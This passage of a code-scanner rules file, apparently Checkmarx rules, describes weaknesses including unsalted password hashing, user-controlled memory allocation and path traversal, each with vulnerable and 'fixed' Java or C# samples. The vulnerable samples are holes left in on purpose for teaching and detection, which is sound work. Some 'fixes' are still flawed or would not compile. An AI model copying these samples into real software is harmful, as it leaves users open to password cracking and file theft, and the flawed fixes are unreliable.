&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;495&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_495_Description" id="oc_495_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product has a method that is declared public, but returns a
reference to a private array, which could then be modified in unexpected
ways.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_495_Time of Introduction" id="oc_495_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_495_Applicable Platforms" id="oc_495_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;C&lt;/p&gt;
&lt;p&gt;C++&lt;/p&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;p&gt;.NET&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_495_Demonstrative Examples" id="oc_495_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;Here, a public method in a Java class returns a reference to a
private array. Given that arrays in Java are mutable, any modifications made
to the returned reference would be reflected in the original private
array.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;private String[] colors;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;public String[] getColors() {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;return colors;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_495_Potential Mitigations" id="oc_495_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Declare the method private.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Clone the member data and keep an unmodified version of the data
private to the object.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use public setter methods that govern how a member can be modified.
&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_495_Relationships" id="oc_495_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;485&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=485" target="_blank"&gt;Insufficient Encapsulation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_495_Taxonomy Mappings" id="oc_495_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Private Array-Typed Field Returned From A Public
Method&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="White Box Definitions"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;White Box Definitions&lt;/div&gt;&lt;div name="oc_495_White Box Definitions" id="oc_495_White Box Definitions" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;A weakness where code path has a statement that belongs to a public method
and returns a reference to a private array field&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_495_Content History" id="oc_495_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;KDM Analytics&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated white box definitions&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1683</key><name>Use_of_a_One_Way_Hash_without_a_Salt</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If an attacker gains access to the hashed passwords, she would likely be able to reverse the hash due to this weakness, and retrieve the original password. Once the passwords are discovered, the attacker can impersonate the users, and take full advantage of their privileges and access their personal data. Furthermore, this would likely not be discovered, as the attacker is being identified solely by the victims' credentials.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Typical cryptographic hashes, such as SHA-1 and MD5, are incredibly fast. Combined with attack techniques such as precomputed Rainbow Tables, it is relatively easy for attackers to reverse the hashes, and discover the original passwords. Lack of a unique, random salt added to the password makes brute force attacks even simpler.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Generic Guidance:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Always use strong, modern algorithms for encryption, hashing, and so on.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Do not use weak, outdated, or obsolete algorithms.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;-&amp;nbsp;Ensure you select the correct cryptographic mechanism according to the specific requirements.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Specific Recommendations:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Passwords should be protected using a password hashing algorithm, instead of a general cryptographic hash. This includes adaptive hashes such as bcrypt, scrypt, PBKDF2 and Argon2.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Tune the work factor, or cost, of the adaptive hash function according to the designated environment and risk profile.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Do not use a regular cryptographic hash, such as SHA-1 or MD5,&amp;nbsp;to protect passwords, as these are too fast.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- If it is necessary to use a common hash to protect passwords, add several bytes of unique, random data ("salt") to the password before hashing it. Store the salt with the hashed password, and do not reuse the same salt for multiple passwords.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unsalted Hashed Password&lt;/h4&gt;&lt;pre&gt;private String protectPassword(String password) {
	byte[] data = password.getBytes();
  	byte[] hash = null; 
  
  	MessageDigest md = MessageDigest.getInstance("MD5");
  	hash = md.digest(data);
  
  	return Base64.getEncoder().encodeToString(hash); 
}&lt;/pre&gt;&lt;h4&gt;Fast Hash with Salt&lt;/h4&gt;&lt;pre&gt;private String protectPassword(String password) {
	byte[] data = password.getBytes("UTF-8");
  	byte[] hash = null; 
  	  
  	try { 
	  	MessageDigest md = MessageDigest.getInstance("SHA-1");
  	
      	SecureRandom rand = new SecureRandom();
      	byte[] salt = new byte[32];
      	rand.nextBytes(salt); 
      
  		md.update(salt);
      	md.update(data); 
      
      	hash = md.digest();
    }
  	catch (GeneralSecurityException gse) {
      	handleCryptoErrors(gse);
    }
  	finally {
      	Arrays.fill(data, 0);
    }
  
  	return Base64.getEncoder().encodeToString(hash); 
}&lt;/pre&gt;&lt;h4&gt;Slow, Adaptive Password Hash&lt;/h4&gt;&lt;pre&gt;private String protectPassword(String password) {
	byte[] data = password.getBytes("UTF-8");
  	byte[] hash = null; 
  
  	try { 
      	SecureRandom rand = new SecureRandom();
      	byte[] salt = new byte[32];
      	rand.nextBytes(salt); 

      	SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA512");
      	PBEKeySpec spec = new PBEKeySpec(data, salt, ITERATION_COUNT, KEY_LENGTH);
      	// ITERATION_COUNT should be configured by environment, KEY_LENGTH should be 256
      	SecretKey key = skf.generateSecret(spec);
      
      	hash = key.getEncoded(); 
    }
	catch (GeneralSecurityException gse) {
      	handleCryptoErrors(gse);
    }
  	finally {
      	Arrays.fill(data, 0);
    }
  
  	return Base64.getEncoder().encodeToString(hash); 
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1682</key><name>Use_of_a_One_Way_Hash_with_a_Predictable_Salt</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If an attacker gains access to the hashed passwords, she would likely be able to reverse the hash due to this weakness, and retrieve the original password. Once the passwords are discovered, the attacker can impersonate the users, and take full advantage of their privileges and access their personal data. Furthermore, this would likely not be discovered, as the attacker is being identified solely by the victims' credentials.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Typical cryptographic hashes, such as SHA-1 and MD5, are incredibly fast. Combined with attack techniques such as precomputed Rainbow Tables, it is relatively easy for attackers to reverse the hashes, and discover the original passwords. Lack of a unique, random salt added to the password makes brute force attacks even simpler.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Generic Guidance:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Always use strong, modern algorithms for encryption, hashing, and so on.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Do not use weak, outdated, or obsolete algorithms.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;-&amp;nbsp;Ensure you select the correct cryptographic mechanism according to the specific requirements.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Specific Recommendations:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Passwords should be protected using a password hashing algorithm, instead of a general cryptographic hash. This includes adaptive hashes such as bcrypt, scrypt, PBKDF2 and Argon2.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Tune the work factor, or cost, of the adaptive hash function according to the designated environment and risk profile.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Do not use a regular cryptographic hash, such as SHA-1 or MD5,&amp;nbsp;to protect passwords, as these are too fast.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- If it is necessary to use a common hash to protect passwords, add several bytes of unique, random data ("salt") to the password before hashing it. Store the salt with the hashed password, and do not reuse the same salt for multiple passwords.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unsalted Hashed Password&lt;/h4&gt;&lt;pre&gt;private String protectPassword(String password) {
	byte[] data = password.getBytes();
  	byte[] hash = null; 
  
  	MessageDigest md = MessageDigest.getInstance("MD5");
  	hash = md.digest(data);
  
  	return Base64.getEncoder().encodeToString(hash); 
}&lt;/pre&gt;&lt;h4&gt;Fast Hash with Salt&lt;/h4&gt;&lt;pre&gt;private String protectPassword(String password) {
	byte[] data = password.getBytes("UTF-8");
  	byte[] hash = null; 
  	  
  	try { 
	  	MessageDigest md = MessageDigest.getInstance("SHA-1");
  	
      	SecureRandom rand = new SecureRandom();
      	byte[] salt = new byte[32];
      	rand.nextBytes(salt); 
      
  		md.update(salt);
      	md.update(data); 
      
      	hash = md.digest();
    }
  	catch (GeneralSecurityException gse) {
      	handleCryptoErrors(gse);
    }
  	finally {
      	Arrays.fill(data, 0);
    }
  
  	return Base64.getEncoder().encodeToString(hash); 
}&lt;/pre&gt;&lt;h4&gt;Slow, Adaptive Password Hash&lt;/h4&gt;&lt;pre&gt;private String protectPassword(String password) {
	byte[] data = password.getBytes("UTF-8");
  	byte[] hash = null; 
  
  	try { 
      	SecureRandom rand = new SecureRandom();
      	byte[] salt = new byte[32];
      	rand.nextBytes(salt); 

      	SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA512");
      	PBEKeySpec spec = new PBEKeySpec(data, salt, ITERATION_COUNT, KEY_LENGTH);
      	// ITERATION_COUNT should be configured by environment, KEY_LENGTH should be 256
      	SecretKey key = skf.generateSecret(spec);
      
      	hash = key.getEncoded(); 
    }
	catch (GeneralSecurityException gse) {
      	handleCryptoErrors(gse);
    }
  	finally {
      	Arrays.fill(data, 0);
    }
  
  	return Base64.getEncoder().encodeToString(hash); 
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1665</key><name>Uncontrolled_Memory_Allocation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Allowing an untrusted user to control the amount of memory allocated in the application could allow an attacker to increase memory consumption arbitrarily, eventually causing out-of-memory errors in the application or possibly even crashing the server, causing a DoS (Denial of Service) attack.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application declares and instantiates a large object, representing a data structure containing a collection of a given type of object. The size of the collection, and the number of elements contained in it, is initially set when constructing the object. However, the application sets the initial capacity based on external, untrusted user input, e.g. via the size of data or even as an explicit value.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&amp;nbsp;- Do not allow untrusted users to control memory allocation.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Avoid instantiating collection objects based on external user input, if possible.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- If necessary, validate all input before instantiating a collection based on the value or size of data.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- In particular, constrain the maximum size of the initial capacity of the collection to a sane default.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Ensure the application fails securely even in limited memory scenarios.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User-controlled Initialization of Collection&lt;/h4&gt;&lt;pre&gt;private Map&lt;int, MyObj&gt; buildCollection(HttpServletRequest req) {
  	int count = Integer.parseInt(req.getParameter("count"));
  
	HashMap&lt;int, MyObj&gt; map = new HashMap&lt;int, MyObj&gt;(count);

  	for (int i = 0; i &lt; count; i++) {
      	map.put(i, new MyObj(i));
    }
  
  	return map; 
}&lt;/pre&gt;&lt;h4&gt;Constrained Initialization of Collection&lt;/h4&gt;&lt;pre&gt;private Map&lt;int, MyObj&gt; buildCollection(HttpServletRequest req) {
  	int count = MAX_COLLECTION_SIZE;  // e.g. static final int MAX_COLLECTION_SIZE = 16;
  
	HashMap&lt;int, MyObj&gt; map = new HashMap&lt;int, MyObj&gt;(count);

  	for (int i = 0; i &lt; count; i++) {
      	map.put(i, new MyObj(i));
    }
  
  	return map; 
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1670</key><name>Absolute_Path_Traversal</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could define any arbitrary file path for the application to use, potentially leading to:&lt;/div&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;Stealing sensitive files, such as configuration or system files&lt;/li&gt;
&lt;li&gt;Overwriting files such as program binaries, configuration files, or system files&lt;/li&gt;
&lt;li&gt;Deleting critical files, causing a denial of service (DoS).&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses user input in the file path for accessing files on the application server&amp;#8217;s local disk. This enables an attacker to arbitrarily determine the file path.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, avoid depending on user input for file selection.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Accept user input only for the filename, not for the path and folders.&lt;/li&gt;
&lt;li&gt;Ensure that file path is fully canonicalized.&lt;/li&gt;
&lt;li&gt;Explicitly limit the application to using a designated folder that separate from the applications binary folder.&lt;/li&gt;
&lt;li&gt;Restrict the privileges of the application&amp;#8217;s OS user to necessary files and folders. The application should not be able to write to the application binary folder, and should not read anything outside of the application folder and data folder.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class PathTraversal
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text;
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters are removed from the user input before use
      &lt;/h4&gt;&lt;pre&gt;public class PathTraversalFixed
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text.Replace("\", "").Replace("..", "");
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;h4&gt;Potentially hazardous characters are removed from the user input before use&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal_Fixed {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        name = name.replace("/", "").replace("..", "");
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1658</key><name>Relative_Path_Traversal</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could define any arbitrary file path for the application to use, potentially leading to:&lt;/div&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;Stealing sensitive files, such as configuration or system files&lt;/li&gt;
&lt;li&gt;Overwriting files such as program binaries, configuration files, or system files&lt;/li&gt;
